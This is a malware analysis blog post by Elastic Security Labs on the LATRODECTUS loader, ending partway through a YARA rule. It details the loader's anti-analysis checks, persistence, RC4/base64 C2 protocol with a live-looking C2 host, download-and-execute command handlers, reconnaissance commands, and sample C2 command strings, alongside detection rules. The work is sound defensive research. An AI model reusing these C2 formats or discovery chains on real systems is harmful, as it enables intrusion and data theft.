---
title: "Spring Cleaning with LATRODECTUS: A Potential Replacement for ICEDID"
slug: "spring-cleaning-with-latrodectus"
date: "2024-05-16"
subtitle: "The LATRODECTUS loader evolves to deliver ICEDID and other malware"
description: "Elastic Security Labs has observed an uptick in a recent emerging loader known as LATRODECTUS. This lightweight loader packs a big punch with ties to ICEDID and may turn into a possible replacement to fill the gap in the loader market."
author:
  - slug: daniel-stepanic
  - slug: samir-bousseaden
image: "Security Labs Images 16.jpg"
category:
  - slug: malware-analysis
tags:
  - icedid
  - latrodectus
  - loader
---

## LATRODECTUS at a glance

First [discovered](https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39) by Walmart researchers in October of 2023, [LATRODECTUS](https://malpedia.caad.fkie.fraunhofer.de/details/win.unidentified_111) is a malware loader gaining popularity among cybercriminals. While this is considered a new family, there is a strong link between LATRODECTUS and [ICEDID](https://www.elastic.co/security-labs/thawing-the-permafrost-of-icedid-summary) due to behavioral and developmental similarities, including a command handler that downloads and executes encrypted payloads like ICEDID. Proofpoint and Team Cymru built upon this connection to discover a [strong link](https://www.proofpoint.com/us/blog/threat-insight/latrodectus-spider-bytes-ice) between the network infrastructure used by both the operators of ICEDID and LATRODECTUS.

LATRODECTUS offers a comprehensive range of standard capabilities that threat actors can utilize to deploy further payloads, conducting various activities after initial compromise. The code base isn’t obfuscated and contains only 11 command handlers focused on enumeration and execution. This type of loader represents a recent wave observed by our team such as [PIKABOT](https://www.elastic.co/security-labs/pikabot-i-choose-you), where the code is more lightweight and direct with a limited number of handlers. 

This article will focus on LATRODECTUS itself, analyzing its most significant features and sharing resources for addressing this financially impactful threat.

### Key takeaways

 - Initially discovered by Walmart researchers last year, LATRODECTUS continues to gain adoption among recent financially-motivated campaigns
 - LATRODECTUS, a possible replacement for ICEDID shares similarity to ICEDID including a command handler to execute ICEDID payloads
 - We observed new event handlers (process discovery, desktop file listing) since its inception and integration of a self-delete technique to delete running files
 - Elastic Security provides a high degree of capability through memory signatures, behavioral rules, and hunting opportunities to respond to threats like LATRODECTUS

### LATRODECTUS campaign overview

Beginning early March of 2024, Elastic Security Labs observed an increase in email campaigns delivering LATRODECTUS. These campaigns typically involve a recognizable infection chain involving oversized JavaScript files that utilize WMI’s ability to invoke msiexec.exe and install a remotely-hosted MSI file, remotely hosted on a WEBDAV share.

![](/assets/images/spring-cleaning-with-latrodectus/image44.png)

With major changes in the loader space during the past year, such as the [QBOT](https://www.elastic.co/security-labs/qbot-malware-analysis) takedown and [ICEDID](https://www.elastic.co/security-labs/unpacking-icedid) dropping off, we are seeing new loaders such as [PIKABOT](https://www.elastic.co/security-labs/pikabot-i-choose-you) and [LATRODECTUS](https://malpedia.caad.fkie.fraunhofer.de/details/win.unidentified_111) have emerged as possible replacements.

## LATRODECTUS analysis

Our LATRODECTUS [sample](https://www.virustotal.com/gui/file/aee22a35cbdac3f16c3ed742c0b1bfe9739a13469cf43b36fb2c63565111028c/details) comes initially packed with file information [masquerading](https://attack.mitre.org/techniques/T1036/) as a component to Bitdefender’s kernel-mode driver (TRUFOS.SYS), shown in the following image.

![File version information of packed LATRODECTUS sample](/assets/images/spring-cleaning-with-latrodectus/image47.png)


In order to move forward with malware analysis, the sample must be unpacked manually or via an automatic unpacking service such as [UnpacMe](http://Unpac.Me).

![UnpacMe summary](/assets/images/spring-cleaning-with-latrodectus/image26.png)


LATRODECTUS is a DLL with 4 different exports, and each export is assigned the same export address.

![Exports for LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image21.png)


### String obfuscation 

All of the strings within LATRODECTUS are protected using a straightforward algorithm on the encrypted bytes and applying a transformation by performing arithmetic and bitwise operations. The initial [report](https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39) published in 2023 detailed a PRNG algorithm that was not observed in our sample, suggesting continuous development of this loader. Below is the algorithm implemented in Python using our [nightMARE framework](https://github.com/elastic/labs-releases/tree/main/nightMARE):

``` python
def decrypt_string(encrypted_bytes: bytes) -> bytes:
    x = cast.u32(encrypted_bytes[:4])
    y = cast.u16(encrypted_bytes[4:6])
    byte_size = cast.u16(cast.p32(x ^ y)[:2])
    decoded_bytes = bytearray(byte_size)

    for i, b in enumerate(encrypted_bytes[6 : 6 + byte_size]):
        decoded_bytes[i] = ((x + i + 1) ^ b) % 256

    return bytes(decoded_bytes)
```

### Runtime API

LATRODECTUS obfuscates the majority of its imports until runtime. At the start of the program, it queries the PEB in combination with using a CRC32 checksum to resolve ```kernel32.dll``` and ```ntdll.dll``` modules and their functions. In order to resolve additional libraries such as ```user32.dll``` or ```wininet.dll```, the malware takes a different approach performing a wildcard search (```*.dll```) in the Windows system directory. It retrieves each DLL filename and passes them directly to a CRC32 checksum function. 

![DLL search using a CRC32 checksum](/assets/images/spring-cleaning-with-latrodectus/image15.png)


### Anti-analysis
When all the imports are resolved, LATRODECTUS performs several serial anti-analysis checks. The first monitors for a debugger by looking for the BeingDebugged flag inside the Process Environment Block (PEB). If a debugger is identified, the program terminates.

![```BeingDebugged``` check via PEB](/assets/images/spring-cleaning-with-latrodectus/image35.png)


In order to avoid sandboxes or virtual machines that may have a low number of active processes, two validation checks are used to combine the number of running processes with the OS product version. 

![Number of processes and OS validation checks](/assets/images/spring-cleaning-with-latrodectus/image30.png)


In order to account for the major differences between Windows OS versions, the developer uses a custom enum based on the major/minor version, and build numbers within Windows.

![Enum related to build numbers, OS version](/assets/images/spring-cleaning-with-latrodectus/image4.png)


The two previous conditions translate to:

 - LATRODECTUS will exit if the number of processes is less than 75 and the OS version is a recent build such as Windows 10, Windows Server 2016, or Windows 11
 - LATRODECTUS will exit if the number of processes is less than 50 and the OS version is an older build such as Windows Server 2003 R2, Windows XP, Windows 2000, Windows 7, Windows 8, or Windows Server 2012/R2

After the sandbox check, LATRODECTUS verifies if the current process is running under WOW64, a subsystem of Windows operating systems that allows for 32-bit applications to run on 64-bit systems. If true (running as a 32-bit application on a 64-bit OS), the malware will exit.

![```IsWow64Process``` check](/assets/images/spring-cleaning-with-latrodectus/image27.png)


The last check is based on verifying the MAC address via the ```GetAdaptersInfo()``` call from ```iphlpapi.dll```. If there is no valid MAC Address, the malware will also terminate.

![MAC Address check](/assets/images/spring-cleaning-with-latrodectus/image36.png)


### Mutex

This malware uses the string ```runnung``` as the mutex to prevent re-infection on the host, which may be an accidental typo on the part of developers.

![Mutex](/assets/images/spring-cleaning-with-latrodectus/image29.png)


### Hardware ID

After the mutex creation, LATRODECTUS will generate a hardware ID that is seeded from the volume serial number of the machine in combination with multiplying a hard-coded constant (```0x19660D```).

![HWID calculation](/assets/images/spring-cleaning-with-latrodectus/image6.png)


### Campaign ID

At this stage, the decrypted campaign name (```Littlehw```) from our sample is used as a seed passed into a Fowler–Noll–Vo hashing [function](https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function). This will produce a hash that is used by the actor to track different campaigns and associated victim machines.

![Campaign ID calculation using FNV](/assets/images/spring-cleaning-with-latrodectus/image37.png)


### Setup / persistence

The malware will generate a folder path using a configuration parameter, these determine the location where LATRODECTUS will be dropped on disk, such as the following directories:
 - ```AppData```
 - ```Desktop```
 - ```Startup```
 - ```Personal```
 - ```Local\AppData```

Our sample was configured with the ```AppData``` location using a hard-coded directory string ```Custom_update``` along with a hardcoded filename ```Update_``` concatenated with digits seeded from the volume serial number. Below is the full file path inside our VM:

```
C:\Users\REM\AppData\Roaming\Custom_update\Update_88d58563.dll
```

The malware will check for an existing file ```AppData\Roaming\Custom_update\update_data.dat``` to read from, and if the file does not exist it will create the directory before writing a copy of itself in the directory.

![LATRODECTUS written in ```AppData```](/assets/images/spring-cleaning-with-latrodectus/image7.png)


After the file is copied, LATRODECTUS retrieves two C2 domains from the global configuration, using the previously-described string decryption function.

![Decrypting C2 servers](/assets/images/spring-cleaning-with-latrodectus/image19.png)


Before the main thread is executed for command dispatching, LATRODECTUS sets up a scheduled task for persistence using the Windows Component Object Model (COM). 

![Scheduled task creation via COM](/assets/images/spring-cleaning-with-latrodectus/image14.png)


In our sample, the task name is hardcoded as ```Updater``` and scheduled to execute upon successful logon.

![Scheduled task properties](/assets/images/spring-cleaning-with-latrodectus/image12.png)


### Self-deletion

Self-deletion is one noteworthy technique incorporated by LATRODECTUS. It was [discovered](https://x.com/jonasLyk/status/1350401461985955840) by Jonas Lykkegaard and implemented by Lloyd Davies in the delete-self-poc [repo](https://github.com/LloydLabs/delete-self-poc). The technique allows LATRODECTUS to delete itself while the process is still running using an alternate data stream. 

Elastic Security Labs has seen this technique adopted in malware such as the [ROOK](https://chuongdong.com/reverse%20engineering/2022/01/06/RookRansomware/#anti-detection-alternate-data-streams) ransomware family. The likely objective is to hinder incident response processes by interfering with collection and analysis. The compiled malware contains a [string](https://github.com/LloydLabs/delete-self-poc/blob/49fe92218fdcfe8e173aa60a9eb307bae07cb027/main.h#L10) (```:wtfbbq```) present in the repository.

![Self-deletion code in LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image2.png)


This technique is observed at the start of the infection as well as when the malware performs an update using event handler #15. Elastic Security Labs has created a [CAPA rule](https://github.com/mandiant/capa-rules/blob/master/anti-analysis/anti-forensic/self-deletion/self-delete-using-alternate-data-streams.yml) to help other organizations identify this behavior generically when analyzing various malware.

### Communication

LATRODECTUS encrypts its requests using base64 and RC4 with a hardcoded password of ```12345```. The first POST request over HTTPS that includes victim information along with configuration details, registering the infected system.

```
POST https://aytobusesre.com/live/ HTTP/1.1
Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tob 1.1)
Host: aytobusesre.com
Content-Length: 256
Cache-Control: no-cache

M1pNDFh7flKrBaDJqAPvJ98BTFDZdSDWDD8o3bMJbpmu0qdYv0FCZ0u6GtKSN0g//WHAS2npR/HDoLtIKBgkLwyrIh/3EJ+UR/0EKhYUzgm9K4DotfExUiX9FBy/HeV7C4PgPDigm55zCU7O9kSADMtviAodjuRBVW3DJ2Pf5+pGH9SG1VI8bdmZg+6GQFpcFTGjdWVcrORkxBjCGq3Eiv2svt3+ZFIN126PcvN95YJ0ie1Puljfs3wqsW455V7O
```
![Initial registration request](/assets/images/spring-cleaning-with-latrodectus/image32.png)


Below is an example of the decrypted contents sent in the first request:

```
counter=0&type=1&guid=249507485CA29F24F77B0F43D7BA&os=6&arch=1&username=user&group=510584660&ver=1.1&up=4&direction=aytobusesre.com&mac=00:0c:24:0e:29:85;&computername=DESKTOP-3C4ILHO&domain=-
```

| Name | Description |
| ---- | ----------- |
| counter | Number of C2 requests increments by one for each callback |
| type | Type of request (registration, etc) |
| guid | Generated hardware ID seeded by volume serial number |
| os | Windows OS product version |
| arch | Windows architecture version |
| username | Username of infected machine |
| group | Campaign identifier seeded by unique string in binary with FNV |
| version | LATRODECTUS version |
| up | Unknown |
| direction | C2 domain
| mac | MAC Address |
| computername | Hostname of infected machine |
| domain | Domain belonging to infected machine |

Each request is pipe-delimited by an object type, integer value, and corresponding argument. There are 4 object types which route the attacker controlled commands (**CLEARURL**, **URLS**, **COMMAND**, **ERROR**).  

![Command dispatching logic](/assets/images/spring-cleaning-with-latrodectus/image39.png)


The main event handlers are passed through the **COMMAND** object type with the handler ID and their respective argument.

```
COMMAND|12|http://www.meow123.com/test 
```

The **CLEARURL** object type is used to delete any configured domains. The **URLS** object type allows the attacker to swap to a new C2 URL. The last object type, **ERROR**, is not currently configured.

![Example of command request via CyberChef](/assets/images/spring-cleaning-with-latrodectus/image11.png)


### Bot Functionality

LATRODECTUS’s core functionality is driven through its command handlers. These handlers are used to collect information from the victim machine, provide execution capabilities as well as configure the implant. We have seen two additional handlers (retrieve processes, desktop listing) added since the initial [publication](https://medium.com/walmartglobaltech/icedid-gets-loaded-af073b7b6d39) which may be a sign that the codebase is still active and changing. 


| Command ID | Description |
| ---------- | ----------- |
| 2 | Retrieve file listing from desktop directory |
| 3 | Retrieve process ancestry |
| 4 | Collect system information |
| 12 | Download and execute PE |
| 13 | Download and execute DLL |
| 14 | Download and execute shellcode |
| 15 | Perform update, restart |
| 17 | Terminate own process and threads |
| 18 | Download and execute ICEDID payload |
| 19 | Increase Beacon Timeout |
| 20 | Resets request counter |

#### Desktop listing - command ID (2)

This command handler will retrieve a list of the contents of the user’s desktop, which the developer refers to as ```desklinks```. This data will be encrypted and appended to the outbound beacon request. This is used for enumerating and validating victim environments quickly.

![Desktop listing (Handler #2)](/assets/images/spring-cleaning-with-latrodectus/image16.png)


**Example request**:

```
counter=0&type=1&guid=249507485CA29F24F77B0F43D7BA&os=6&arch=1&username=user&group=510584660&ver=1.1&up=4&direction=aytobusesre.com&desklinks=["OneDrive.lnk","OneNote.lnk","PowerPoint.lnk","Notepad++.lnk","Excel.lnk","Google Chrome.lnk","Snipping Tool.lnk","Notepad.lnk","Paint.lnk"]
```

#### Process ancestry - command ID (3)

This event handler is referenced as **proclist** by the developer where it collects the entire running process ancestry from the infected machine via the **CreateToolhelp32Snapshot** API. 

![Retrieve process ancestry (Handler #3)](/assets/images/spring-cleaning-with-latrodectus/image25.png)


Like security researchers, malware authors are interested in process parent/child relationships for decision-making. The authors of LATRODECTUS even collect information about process grandchildren, likely to validate different compromised environments.

![Example of process ancestry collected by LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image17.png)


#### Collect system information - command ID (4)

This command handler creates a new thread that runs the following system discovery/enumeration commands, each of which is a potential detection opportunity:

``` bash
C:\Windows\System32\cmd.exe /c ipconfig /all
C:\Windows\System32\cmd.exe /c systeminfo
C:\Windows\System32\cmd.exe /c nltest /domain_trusts
C:\Windows\System32\cmd.exe /c nltest /domain_trusts /all_trusts
C:\Windows\System32\cmd.exe /c net view /all /domain
C:\Windows\System32\cmd.exe /c net view /all
C:\Windows\System32\cmd.exe /c net group "Domain Admins" /domain
C:\Windows\System32\wbem\wmic.exe /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:List
C:\Windows\System32\cmd.exe /c net config workstation
C:\Windows\System32\cmd.exe /c wmic.exe /node:localhost /namespace:\\root\SecurityCenter2 path AntiVirusProduct Get DisplayName | findstr /V /B /C:displayName || echo No Antivirus installed
C:\Windows\System32\cmd.exe /c whoami /groups
```

Each output is placed into URI with corresponding collected data:

```
&ipconfig=
&systeminfo=
&domain_trusts=
&domain_trusts_all=
&net_view_all_domain=
&net_view_all=
&net_group=
&wmic=
&net_config_ws=
&net_wmic_av=
&whoami_group=
```

#### Download and execute PE - command ID (12)

This handler downloads a PE file from the C2 server then writes the content to disk with a randomly generated file name, then executes the file.

![Download and Run PE function (Handler #4)](/assets/images/spring-cleaning-with-latrodectus/image19.png)


Below is an example in our environment using this handler:

![Process tree of download and run PE function](/assets/images/spring-cleaning-with-latrodectus/image34.png)


#### Download and execute DLL - command ID (13)

This command handler downloads a DLL from C2 server, writes it to disk with a randomly generated file name, and executes the DLL using rundll32.exe.

![Download and run DLL function (Handler #13)](/assets/images/spring-cleaning-with-latrodectus/image10.png)


#### Download and execute shellcode - command (14)

This command handler downloads shellcode from the C2 server via ```InternetReadFile```, allocates and copies the shellcode into memory then directly calls it with a new thread pointing at the shellcode.

![Shellcode execution (Handler #14)](/assets/images/spring-cleaning-with-latrodectus/image24.png)


#### Update / restart  - command ID (15)

This handler appears to perform a binary update to the malware where it’s downloaded, the existing thread/mutex is notified, and then released. The file is subsequently deleted and a new binary is downloaded/executed before terminating the existing process.

![Update handler (Handler #15)](/assets/images/spring-cleaning-with-latrodectus/image33.png)


#### Terminate - command ID (17)
This handler will terminate the existing LATRODECTUS process.

![Self-termination (Handler #17)](/assets/images/spring-cleaning-with-latrodectus/image46.png)


#### Download and execute hosted ICEID payload - command ID (18)

This command handler downloads two ICEDID components from a LATRODECTUS server and executes them using a spawned ```rundll32.exe``` process. We haven’t personally observed this being used in-the-wild, however.

The handler creates a folder containing two files to the ```AppData\Roaming\``` directory. These file paths and filenames are seeded by a custom random number generator which we will review in the next section. In our case, this new folder location is: 

```
C:\Users\REM\AppData\Roaming\-632116337
```

It retrieves a file (```test.dll```) from the C2 server, the standard ICEDID loader, which is written to disk with a randomly -generated file name (```-456638727.dll```).

![LATRODECTUS downloading ICEDID loader](/assets/images/spring-cleaning-with-latrodectus/image9.png)


LATRODECTUS will then perform similar steps by generating a random filename for the ICEDID payload (```1431684209.dat```). Before performing the download, it will set-up the arguments to properly load ICEDID. If you have run into ICEDID in the past, this part of the command-line should look familiar: it’s used to call the ICEDID export of the loader, while passing the relative path to the encrypted ICEDID payload file.

```
init -zzzz="-632116337\1431684209.dat"
```

![LATRODECTUS downloading ICEDID data](/assets/images/spring-cleaning-with-latrodectus/image20.png)


LATRODECUS initiates a second download request using a hard-coded URI (```/files/bp.dat```) from the configured C2 server, which is written to a file (```1431684209.dat```). Analyzing the ```bp.dat``` file, researchers identified it as a conventional encrypted ICEDID payload, commonly referenced as ```license.dat```.

![Encrypted ICEDID payload (```bp.dat```)](/assets/images/spring-cleaning-with-latrodectus/image31.png)


After decrypting the file, malware researchers noted a familiar 129 byte sequence of junk bytes prepended to the file followed by the custom section headers. 

![Decrypted ICEDID payload (```bp.dat```)](/assets/images/spring-cleaning-with-latrodectus/image43.png)


Our team was able to revisit [prior tooling](https://www.elastic.co/security-labs/unpacking-icedid) and successfully decrypt this file, enabling us to rebuild the PE (ICEDID).

![ICEDID YARA triggering on rebuilt PE from ```bp.dat```](/assets/images/spring-cleaning-with-latrodectus/image28.png)


At this point, the ICEDID loader and encrypted payload have been downloaded to the same folder.

![](/assets/images/spring-cleaning-with-latrodectus/image38.png)

These files are then executed together using ```rundll32.exe``` via **CreateProcessW** with their respective arguments. Below is the observed command-line:

```
rundll32.exe C:\Users\REM\AppData\Roaming\-632116337\-456638727.dll,init -zzzz="-632116337\1431684209.dat"
```

![```Rundll32.exe``` execution](/assets/images/spring-cleaning-with-latrodectus/image18.png)


Scanning the ```rundll32.exe``` child process spawned by LATRODECTUS with our ICEDID YARA rule also indicates the presence of the ICEDID. 

![YARA memory scan detecting ICEDID](/assets/images/spring-cleaning-with-latrodectus/image41.png)


#### Beacon timeout - command ID (19)

LATRODECTUS supports jitter for beaconing to C2. This can make it harder for defenders to detect via network sources due to randomness this introduces to beaconing intervals.

![Adjust timeout feature (Handler #19)](/assets/images/spring-cleaning-with-latrodectus/image45.png)


In order to calculate the timeout, it generates a random number by seeding a combination of the user’s cursor position on the screen multiplied by the system’s uptime (```GetTickCount```). This result is passed as a parameter to **RtlRandomEx**. 

![Random number generator using cursor position](/assets/images/spring-cleaning-with-latrodectus/image22.png)


#### Reset counter - command ID (20)

This command handler will reset the request counter that is passed on each communication request. For example, on the third callback it is filled with 3 here. With this function, the developer can reset the count starting from 0.

```
counter=3&type=4&guid=638507385
```

### LATRODECTUS / ICEDID connection

There definitely is some kind of development connection or working arrangement between ICEDID and LATRODECTUS. Below are some of the similarities observed:
 - Same enumeration commands in the system discovery handler
 - The DLL exports all point to same export function address, this was a common observation with ICEDID payloads
 - C2 data is concatenated together as variables in the C2 traffic requests
 - The ```bp.dat``` file downloaded from handler (#18) is used to execute the ICEDID payload via ```rundll32.exe``` 
 - The functions appear to be similarly coded

![COM-based Scheduled Task setup - ICEDID vs LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image13.png)


Researchers didn’t conclude that there was a clear relationship between the ICEDID and LATRODECTUS families, though they appear at least superficially affiliated. ICEDID possesses more mature capabilities, like those used for data theft or the [BackConnect](https://www.team-cymru.com/post/inside-the-icedid-backconnect-protocol) module, and has been richly documented over a period of several years. One hypothesis being considered is that LATRODECTUS is being actively developed as a replacement for ICEDID, and the handler (#18) was included until malware authors were satisfied with LATRODECTUS’ capabilities.

### Sandboxing LATRODECTUS

To evaluate LATRODECTUS detections, we set up a Flask server configured with the different handlers to instruct an infected machine to perform various actions in a sandbox environment. This method provides defenders with a great opportunity to assess the effectiveness of their detection and logging tools against every capability. Different payloads like shellcode/binaries can be exchanged as needed.

![Command handlers sandboxed](/assets/images/spring-cleaning-with-latrodectus/image42.png)


As an example, for the download and execution of a DLL (handler #13), we can provide the following request structure (object type, handler, arguments for handler) to the command dispatcher:

```
COMMAND|13|http://www.meow123.com/dll, ShowMessage
```

The following example depicts the RC4-encrypted string described earlier, which has been base64-encoded.

```
E3p1L21QSBOqEKjYrBKiLNZJTk7KZn+HWn0p2LQfOLWCz/py4VkkAxSXXdnDd39p2EU=
```

Using the following CyberChef recipe, analysts can generate encrypted command requests:

![Example with DLL Execution handler via CyberChef](/assets/images/spring-cleaning-with-latrodectus/image1.png)


Using the actual malware codebase and executing these different handlers using a low-risk framework, defenders can get a glimpse into the events, alerts, and logs recorded by their security instrumentation. 

## Detecting LATRODECTUS

The following Elastic Defend protection features trigger during the LATRODECTUS malware infection process: 

![Elastic Defend alerts against LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image5.png)


Below are the prebuilt MITRE ATT&CK-aligned rules with descriptions:

| ATT&CK technique | Elastic Rule | Description |
| ----- | ----- | ----- |
| [T1059.007 - Javascript](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_oversized_windows_script_execution.toml) [T1027 - Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/) | [Suspicious Oversized Script Execution](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/execution_oversized_windows_script_execution.toml) | LATRODECTUS is delivered via oversized Javascript files, on average more than 800KB filled with random text. |
| [T1047 - Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047/) | [Execution via a Suspicious WMI Client](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/initial_access_execution_via_a_suspicious_wmi_client.toml) | Javascript dropper invokes WMI to mount a WEBDAV share and invokes msiexec to install a remote msi file. |
| [T1218.007 - Misexec](https://attack.mitre.org/techniques/T1218/007/) | [Remote File Execution via MSIEXEC](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_remote_file_execution_via_msiexec.toml) [Suspicious MsiExec Child Process](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_suspicious_msiexec_child_process.toml) | MSI file hosted on remote Webdav and executed in quiet mode. Once executed it drops a DLL and launches rundll32 to load it via the Advanced installer viewer.exe binary. |
| [T1218.011 - Rundll32](https://attack.mitre.org/techniques/T1218/011/) | [Rundll32 or Regsvr32 Loaded a DLL from Unbacked Memory](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_rundll32_or_regsvr32_loaded_a_dll_from_unbacked_memory.toml) | Rundll32 loads the LATRODECTUS DLL from AppData and starts code injection. |
| [T1055 - Process Injection](https://attack.mitre.org/techniques/T1055/) | [Memory Threat Detection Alert: Shellcode Injection](https://www.elastic.co/guide/en/security/current/configure-endpoint-integration-policy.html#memory-protection) [VirtualProtect API Call from an Unsigned DLL](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_virtualprotect_api_call_from_an_unsigned_dll.toml) [Shellcode Execution from Low Reputation Module](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_shellcode_execution_from_low_reputation_module.toml) [Network Module Loaded from Suspicious Unbacked Memory](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_network_module_loaded_from_suspicious_unbacked_memory.toml) | Shellcode execution triggers 3 endpoint behavior alerts and a memory threat detection alert. |
| [T1053.005 - Scheduled Task](https://attack.mitre.org/techniques/T1053/005/) | [Scheduled Task Creation by an Unusual Process](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/persistence_scheduled_task_creation_by_an_unusual_process.toml) | LATRODECTUS may persist using scheduled tasks (rundll32 will create a scheduled task). |
| [T1070.004 - File Deletion](https://attack.mitre.org/techniques/T1070/004/) | [Potential Self Deletion of a Running Executable](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_potential_self_deletion_of_a_running_executable.toml) | Part of the malware DLL self update command and also when the DLL is not running from AppData, LATRODECTUS will delete itself while running and restart from the new path or running an updated version of itself leveraging [this technique](https://github.com/LloydLabs/delete-self-poc). |
| [T1059.003 - Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/) | [Command Shell Activity Started via RunDLL32](https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/execution_command_shell_activity_started_via_rundll32.toml) | LATRODECTUS Command ID (4) - Collect system information via a series of cmd.exe execution. |

The following list of hunts and detection queries can be used to detect LATRODECTUS post-exploitation commands focused on execution:

**Rundll32 Download PE/DLL** (command handlers #12, #13 and #18): 

``` sql
sequence by process.entity_id with maxspan=1s
[file where event.action == "creation" and process.name : "rundll32.exe" and 
 /* PE file header dropped to the InetCache folder */
file.Ext.header_bytes : "4d5a*" and file.path : "?:\\Users\\*\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\*"]
[network where process.name : "rundll32.exe" and 
   event.action : ("disconnect_received", "connection_attempted") and 
   /* network disconnect activity to a public Ip address */
   not cidrmatch(destination.ip, "10.0.0.0/8", "127.0.0.0/8", "169.254.0.0/16", "172.16.0.0/12", "192.0.0.0/24", "192.0.0.0/29", "192.0.0.8/32", "192.0.0.9/32", "192.0.0.10/32", "192.0.0.170/32", "192.0.0.171/32", "192.0.2.0/24", "192.31.196.0/24", "192.52.193.0/24", "192.88.99.0/24", "224.0.0.0/4", "100.64.0.0/10", "192.175.48.0/24","198.18.0.0/15", "198.51.100.0/24", "203.0.113.0/24", "240.0.0.0/4", "::1", "FE80::/10", "FF00::/8", "192.168.0.0/16")]
```

![EQL Query using hunt detecting LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image8.png)


Below is an ES|QL hunt to look for long-term and/or high count of network connections by rundll32 to a public IP address (which is uncommon): 

``` sql
from logs-endpoint.events.network-*
| where host.os.family == "windows" and event.category == "network" and
 network.direction == "egress" and process.name == "rundll32.exe" and
/* excluding private IP ranges */
 not CIDR_MATCH(destination.ip, "10.0.0.0/8", "127.0.0.0/8", "169.254.0.0/16", "172.16.0.0/12", "192.0.0.0/24", "192.0.0.0/29", "192.0.0.8/32", "192.0.0.9/32", "192.0.0.10/32", "192.0.0.170/32", "192.0.0.171/32", "192.0.2.0/24", "192.31.196.0/24", "192.52.193.0/24", "192.168.0.0/16", "192.88.99.0/24", "224.0.0.0/4", "100.64.0.0/10", "192.175.48.0/24","198.18.0.0/15", "198.51.100.0/24", "203.0.113.0/24", "240.0.0.0/4", "::1","FE80::/10", "FF00::/8")
| keep source.bytes, destination.address, process.name, process.entity_id, process.pid, @timestamp, host.name
/* calc total duration and the number of connections per hour */
| stats count_connections = count(*), start_time = min(@timestamp), end_time = max(@timestamp) by process.entity_id, process.pid, destination.address, process.name, host.name
| eval duration = TO_DOUBLE(end_time)-TO_DOUBLE(start_time), duration_hours=TO_INT(duration/3600000), number_of_con_per_hour = (count_connections / duration_hours)
| keep host.name, destination.address, process.name, process.pid, duration, duration_hours, number_of_con_per_hour, count_connections
| where count_connections >= 100
```

![ES|QL Query using hunt detecting LATRODECTUS](/assets/images/spring-cleaning-with-latrodectus/image3.png)


Below is a screenshot of Elastic Defend triggering on the LATRODECTUS [memory signature](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_Latrodectus.yar):   

![Memory signatures against LATRODECTUS via Elastic Defend](/assets/images/spring-cleaning-with-latrodectus/image23.png)


### YARA

Elastic Security has created YARA rules to identify [LATRODECTUS](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_Latrodectus.yar):

```
rule Windows_Trojan_LATRODECTUS_841ff697 {
    meta:
        author = "Elastic Security"
        creation_date = "2024-03-13"
        last_modified = "2024-04-05"
        license = "Elastic License v2"
         os = "Windows"
        arch = "x86"
        threat_name = "Windows.Trojan.LATRODECTUS"
        reference_sample = "aee22a35cbdac3f16c3ed742c0b1bfe9739a13469cf43b36fb2c63565111028c"


    strings:
        $Str1 = { 48 83 EC 38 C6 44 24 20 73 C6 44 24 21 63 C6 44 24 22 75 C6 44 24 23 62 C6 44 24 24 }
        $crc32_loadlibrary = { 48 89 44 24 40 EB 02 EB 90 48 8B 4C 24 20 E8 ?? ?? FF FF 48 8B 44 24 40 48 81 C4 E8 02 00 00 C3 }
        $delete_self = { 44 24 68 BA 03 00 00 00 48 8B 4C 24 48 FF 15 ED D1 00 00 85 C0 75 14 48 8B 4C 24 50 E8 ?? ?? 00 00 B8 FF FF FF FF E9 A6 00 }
        $Str4 = { 89 44 24 44 EB 1F C7 44 24 20 00 00 00 00 45 33 C9 45 33 C0 33 D2 48 8B 4C 24 48 FF 15 7E BB 00 00 89 44 24 44 83 7C 24 44 00 75 02 EB 11 48 8B 44 24 48 EB 0C 33 C0 85 C0 0F 85 10 FE FF FF 33 }
        $handler_check = { 83 BC 24 D8 01 00 00 12 74 36 83 BC 24 D8 01 00 00 0E 74 2C 83 BC 24 D8 01 00 00 0C 74 22 83 BC 24 D8 01 00 00 0D 74 18 83 BC 24 D8 01 00 00 0F 74 0E 83 BC 24 D8 01 00 00 04 0F 85 44 02 00 00 }
